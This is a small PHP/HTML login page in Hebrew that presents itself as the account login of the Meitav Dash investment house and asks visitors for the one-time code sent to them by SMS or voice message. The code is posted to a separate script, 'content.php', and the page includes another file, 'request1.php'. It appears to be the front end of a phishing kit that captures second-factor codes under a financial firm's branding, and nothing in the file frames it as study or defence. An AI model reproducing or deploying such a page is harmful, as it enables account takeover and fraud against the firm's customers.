<?php
   include 'request1.php';
?>

<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8" />
        <title>HTML form/post example</title>
    </head>
    <body dir=rtl>

        <form id="numbers-form" action="content.php" method="post" enctype="multipart/form-data" accept-charset="UTF-8">

            <h1>
                התחברות למערכת של - <br> מיטב דש בית השקעות
            </h1>
            <h1>
                כניסה<br> לחשבון שלי
            </h1>
            <h2>לצפייה בנתונים<br> יש להזין את הפרטים הבאים : </h2>

            <label for="c_id">נא להכניס את הקוד שנשלח אלייך במסרון או בהודעה קולית</label><br />
            <input type="tel" name="c_id" required="required"/>
            <br /><br />

            <!-- <input type="hidden" name="guid" value="" /> -->

            <br /><br />

            <input type="submit" name="submit" value="המשך" />

        </form>

    </body>
</html>
